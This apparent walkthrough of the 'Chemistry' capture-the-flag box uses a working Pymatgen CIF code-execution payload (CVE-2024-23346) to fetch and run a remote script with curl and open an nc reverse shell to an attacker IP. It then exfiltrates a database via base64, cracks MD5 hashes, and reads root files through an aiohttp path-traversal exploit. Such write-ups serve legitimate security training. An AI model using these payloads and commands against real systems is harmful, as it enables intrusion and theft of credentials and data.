# Chemistry - Easy

```sh
sudo vim /etc/hosts
# map target IP to chemistry.htb

nmap -T4 -p- -A -Pn -v chemistry.htb
```

* Open ports & services:

    * 22 - ssh - OpenSSH 8.2p1 Ubuntu 4ubuntu0.11
    * 5000 - http - Werkzeug httpd 3.0.3 (Python 3.9.5)

* The webpage on port 5000 says we can upload CIF (Crystallographic Information Files) and analyze them - the main page has a login and register function

* Web enumeration:

    ```sh
    # directory scanning
    feroxbuster -u http://chemistry.htb:5000 -w /usr/share/dirbuster/wordlists/directory-list-2.3-medium.txt -x php,html,bak,bac,md,jpg,png,ps1,js,txt,json,docx,pdf,zip,cgi,sh,pl,aspx,sql,xml --extract-links --scan-limit 2 --filter-status 400,401,404,405,500 --silent
    ```

* We can use the register function to create a test account and login - the '/dashboard' page has an upload feature for CIF files with an example, and a list of uploads

* We can upload the given CIF file as a test, and intercept the request in Burp Suite - send it to Repeater for testing

* After uploading the CIF file, we can view it in the dashboard - this shows a detailed view of the data in the file

* Searching for vulns or exploits associated with CIF files, we get [CVE-2024-23346](https://www.vicarius.io/vsociety/posts/critical-security-flaw-in-pymatgen-library-cve-2024-23346), which seems to be affecting Pymatgen library prior to version 2024.2.20

* This could be used as the webapp is based off Python as seen from ```nmap```

* We can get the PoC from the [security advisory for this vuln](https://github.com/materialsproject/pymatgen/security/advisories/GHSA-vgv8-5cpj-qj2f) - we can replace the command from PoC by ```sleep 20``` to check if the webapp is vulnerable:

    ```cif
    data_5yOhtAoR
    _audit_creation_date            2018-06-08
    _audit_creation_method          "Pymatgen CIF Parser Arbitrary Code Execution Exploit"

    loop_
    _parent_propagation_vector.id
    _parent_propagation_vector.kxkykz
    k1 [0 0 0]

    _space_group_magn.transform_BNS_Pp_abc  'a,b,[d for d in ().__class__.__mro__[1].__getattribute__ ( *[().__class__.__mro__[1]]+["__sub" + "classes__"]) () if d.__name__ == "BuiltinImporter"][0].load_module ("os").system ("sleep 20");0,0,0'


    _space_group_magn.number_BNS  62.448
    _space_group_magn.name_BNS  "P  n'  m  a'  "
    ```

* We get the response 'Internal Server Error' after 20 seconds so we know the command was executed

* After starting our listener - ```nc -nvlp 4444``` - we can try replacing the ```sleep``` command with a reverse-shell one-liner, but we do not get a shell and the internal server error page still shows up

* However, as ```curl``` works, we can bypass this by using ```curl``` to fetch a script and execute it - this can be tested first:

    ```sh
    echo "ping -c 1 10.10.14.15" > test.sh

    python3 -m http.server 80

    # to check if we are receiving any ICMP packets
    sudo tcpdump -i tun0 icmp
    ```

* Now, if we replace the payload in the CIF file with ```curl http://10.10.14.15/test.sh | sh``` and upload the modified CIF file, we can see that we get a ping from target

* Replace the script contents with the reverse shell one-liner - ```rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|bash -i 2>&1|nc 10.10.14.15 4444 >/tmp/f``` - and upload the CIF file again; this time we get a reverse shell:

    ```sh
    whoami
    # 'app' user
    
    # stabilize shell first
    python3 -c 'import pty;pty.spawn("/bin/bash")'
    export TERM=xterm
    # press Ctrl+Z to background shell
    stty raw -echo; fg
    # press Enter twice to foreground shell

    ls -la /

    # we can enumerate using linpeas.sh

    # host linpeas.sh on attacker

    cd /tmp

    wget http://10.10.14.15/linpeas.sh

    chmod +x linpeas.sh

    ./linpeas.sh
    ```

* The ```linpeas``` script does not give much clues so we can enumerate on our own:

    ```sh
    ls -la /home
    # two users - 'app' and 'rosa'

    ls -la /home/rosa
    # check all files

    ls -la /home/app
    # check all files

    cat /home/app/app.py
    # this includes a cleartext password 'MyS3cretCh3mistry4PP' for the SQLite DB
    # we can try re-using these creds on SSH but it does not work

    ls -la instance
    # we have database.db file here

    # we can transfer this to attacker to check for any data
    md5sum instance/database.db

    cat instance/database.db | base64 -w 0; echo

    # on attacker machine
    echo -n "<base64-encoded string>" | base64 -d > database.db

    md5sum database.db
    # confirm the file is same
    ```

* As it is SQLite DB, we can use ```sqlitebrowser``` to check this:

    ```sh
    # on attacker
    sqlitebrowser database.db
    
    # this shows multiple password hashes with username
    # we can check using hash identifier tools that these are in MD5 format
    # we can copy all hashes to a file
    vim hashes.txt

    hashcat -a 0 -m 0 hashes.txt /usr/share/wordlists/rockyou.txt
    # this gives us the password 'unicorniosrosados' for 'rosa'
    ```

* From the cracked hash, we can try logging in as 'rosa':

    ```sh
    ssh rosa@chemistry.htb
    # we can log in

    cat user.txt
    # user flag

    # continue enumeration

    sudo -l
    # cannot run sudo

    ss -ltnp
    # check open ports
    # we can see port 8080 is listening

    curl http://127.0.0.1:8080
    # shows a dashboard webpage code

    # we can access this from attacker machine
    # using SSH local port forwarding
    ssh -L 8000:localhost:8080 rosa@chemistry.htb

    # we can now access the webpage which was running on target port 8080, on our attacker port 8000
    ```

* Wappalyzer shows that the 'Site Monitoring' webpage is running SimpleHTTP 0.6

* We can get more info about the webpage using Burp Suite or ```curl```:

    ```sh
    curl -v http://localhost:8000
    # this request headers show that the webpage is running on aiohttp/3.9.1
    ```

* Searching for exploits related to ```aiohttp/3.9.1```, we get the LFI vulnerability in [CVE-2024-23334](https://github.com/wizarddos/CVE-2024-23334) - we can use this:

    ```sh
    # download the exploit

    python3 CVE-2024-23334.py -u http://localhost:8000 -f /etc/passwd -d /assets
    # here the static directory is /assets, as seen in source code

    # get root flag
    python3 CVE-2024-23334.py -u http://localhost:8000 -f /root/root.txt -d /assets
    ```
